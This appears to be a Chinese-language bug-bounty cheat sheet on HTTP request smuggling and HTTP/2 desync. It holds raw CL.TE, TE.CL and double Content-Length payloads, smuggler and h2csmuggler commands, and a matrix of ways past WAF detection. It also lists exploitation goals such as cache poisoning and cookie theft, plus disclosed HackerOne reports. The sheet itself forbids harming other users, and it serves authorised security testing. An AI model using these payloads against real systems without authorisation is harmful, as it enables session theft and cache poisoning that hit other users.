# HTTP Request Smuggling / HTTP/2 Desync

> 视角：黑盒，目标是利用前后端解析差异

## 1. 一句话说清

前置代理（CDN / WAF / Nginx）和后端服务器对 `Content-Length` / `Transfer-Encoding` 解析不一致 →
攻击者把"半包"塞进流，影响下个用户的请求/响应。
SRC 价值：成功的 desync = P1/P0（$2k–$10k+）。

---

## 2. 类型速览

| 类型 | 前置代理用 | 后端用 |
|------|----------|------|
| **CL.TE** | Content-Length | Transfer-Encoding |
| **TE.CL** | Transfer-Encoding | Content-Length |
| **TE.TE** | 都看，但前后处理混淆 | 同 |
| **HTTP/2 → HTTP/1 desync** | h2 | h1 后端 |
| **CL.0** | CL=0 后端忽略 | 后端读 body |

---

## 3. 探测手法

### 3.1 工具

```bash
# Burp 扩展
HTTP Request Smuggler

# 命令行
smuggler.py -u https://target -v
http2smugl quirks --target target.com:443
h2csmuggler -u https://target/ --path /admin
```

### 3.2 经典 PoC

#### CL.TE

```
POST / HTTP/1.1
Host: victim
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

前端按 CL=6 读了 `0\r\n\r\nG`，后端按 chunked 看到 `0\r\n\r\n` 结束，剩下 `G` 进入下一个请求。

#### TE.CL

```
POST / HTTP/1.1
Host: victim
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
...
0

```

#### 双 CL

```
POST / HTTP/1.1
Host: victim
Content-Length: 4
Content-Length: 1

GPOST...
```

#### CL.0（HTTP/2 时常见）

后端忽略 CL（POST 当 GET 处理），前端按 CL 取走 body → 走私。

#### h2c smuggling

```bash
h2csmuggler -u http://target/ --path /admin
# 利用 HTTP/1.1 → HTTP/2 升级让前置代理失效
```

---

## 4. Bypass 矩阵

| 拦 | 绕 |
|---|---|
| 标准 CL/TE 检测 | TE 大小写：`Transfer-encoding`、`transfer-Encoding` |
| TE 拦 | TE 末尾加空格：`Transfer-Encoding : chunked` |
| WAF 检测 | TE 值变形：`chunked`、`chunked,gzip`、`xchunked` |
| 标准 chunk 拦 | 0 大小 chunk 后塞数据 |
| h2 关闭 | h2c upgrade |

---

## 5. 利用提权 / 横向

```
1. 缓存投毒：让代理把恶意响应缓存为另一 URL
2. 跨用户访问：把 admin 端点的响应"借"给下个用户
3. 旁路 IP 限制：用走私走过 IP 校验
4. 偷 secret：让别人的请求 + 自己的响应混合
5. XSS（缓存了走私响应）
```

---

## 6. 真实案例指纹

- PortSwigger blog 系列（James Kettle）
- Cloudflare / Akamai 多次披露
- HackerOne H1 上 desync 报告 $5k–$30k

通用指纹：
- 同一连接发 2 个请求，第 2 个响应"看起来是别的请求的"
- 偶尔 503 / 502 / 异常 status code
- 代理日志和后端日志请求数对不上

---

## 7. 复现 / 证据要点

### 7.1 PoC

```
# 在 Burp Repeater 用 raw 模式发送下面包（保留 CRLF）
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0\r\n\r\nG

# 立即第二个请求（同连接，Burp Repeater 同样栏）
GET / HTTP/1.1
Host: target.com

→ 第二个响应应当反映前一次走私的 'G' 前缀
```

### 7.2 CVSS

```
HTTP smuggling → 缓存投毒          = 8.1 High
HTTP smuggling → 旁路鉴权           = 9.1 Critical
HTTP smuggling → 跨用户             = 8.1 High
```

---

## 8. 不要做的事

- **禁**：在生产上做大流量 desync 测试（影响他人请求）。低速、单次验证。
- **禁**：把走私构造的恶意响应缓存到全站共享路径（其他用户会受影响）。在你自己的 cache key 上演示。
- **禁**：实际偷取他人 cookie / token。看到 desync 现象即停。

## H1 真实案例

_共 38 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 + 投票×100) 排序取 Top 12_

| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
|---|--:|---|---|---|
| High | 20000 usd | PayPal | [Bypass for #488147 enables stored XSS on https://paypal.com/signin again](https://hackerone.com/reports/510152) | Bypass for #488147 enables stored XSS on https://paypal.com/signin again |
| High | 18900 usd | PayPal | [Stored XSS on https://paypal.com/signin via cache poisoning](https://hackerone.com/reports/488147) | Stored XSS on https://paypal.com/signin via cache poisoning |
| Critical | — | Slack | [Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies](https://hackerone.com/reports/737140) | Hi Slack Security Team! My name is Evan and I'm a first time bug hunter to your platform :) Because you guys were running a mon… |
| High | — | LY Corporation | [Request smuggling on admin-official.line.me could lead to account takeover](https://hackerone.com/reports/740037) | Request smuggling on admin-official.line.me could lead to account takeover |
| Critical | — | Eternal | [Stealing Zomato X-Access-Token: in Bulk using HTTP Request Smuggling on api.zomato.com](https://hackerone.com/reports/771666) | Intro Hi Zomato Security Team! My name is Evan Custodio and this is my first time evaluating your platform. I specialize in loo… |
| Critical | 7500 usd | Basecamp | [HTTP Request Smuggling via HTTP/2](https://hackerone.com/reports/1211724) | HTTP Request Smuggling via HTTP/2 |
| High | — | Helium | [HTTP request Smuggling](https://hackerone.com/reports/867952) | When malformed or abnormal HTTP requests are interpreted by one or more entities in the data flow between the user and the web … |
| Critical | 6000 usd | Cloudflare Public Bug Bounty | [HTTP Request Smuggling in Transform Rules using hexadecimal escape sequences in the concat() func…](https://hackerone.com/reports/1478633) | HTTP Request Smuggling in Transform Rules using hexadecimal escape sequences in the concat() function |
| High | 750 usd | GSA Bounty | [HTTP Request Smuggling on https://labs.data.gov](https://hackerone.com/reports/726773) | Greetings, The application appears to be vulnerable to HTTP request smuggling due to a disagreement between the front-end and b… |
| High | 4660 usd | Internet Bug Bounty | [Possibility of Request smuggling attack](https://hackerone.com/reports/2280391) | Request smuggling was possible by throwing an IOException with the upper size limit of the trailer header |
| High | — | Node.js | [HTTP Request Smuggling due to CR-to-Hyphen conversion](https://hackerone.com/reports/922597) | NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, th… |
| Critical | 5000 usd | Aiven Ltd | [Grafana RCE via SMTP server parameter injection](https://hackerone.com/reports/1200647) | Summary: This report is similar to #1180653, except with different parameter injection entrypoint |

**命中本类的 weakness 分布：**

- HTTP Request Smuggling：27 条
- CRLF Injection：5 条
- Uncategorized → 手工归类：4 条
- HTTP Response Splitting：2 条
